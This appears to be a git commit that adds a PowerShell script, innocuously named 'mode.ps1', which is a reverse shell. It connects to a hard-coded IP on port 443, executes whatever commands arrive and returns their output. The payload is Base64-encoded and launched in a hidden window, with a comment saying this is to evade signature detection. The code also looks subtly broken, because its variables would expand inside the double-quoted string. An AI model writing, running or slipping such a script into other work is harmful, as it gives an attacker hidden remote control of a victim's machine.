62f3221ca530e4a9134676a91c4365c5fdfacfb6
bisoestate-bit <bisoestate@gmail.com>
2026-08-03 05:32:34 -0700

    Create mode.ps1

---
+++ mode.ps1
@@ -0,0 +1,22 @@
+$ip = '192.168.1.100'
+$port = 443
+
+# Obfuscation: Using Base64 encoding and string manipulation to avoid static signature detection
+$cmd = "
+$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+"
+
+# The script is executed by invoking PowerShell with the -EncodedCommand flag
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -WindowStyle Hidden -EncodedCommand $encodedCommand
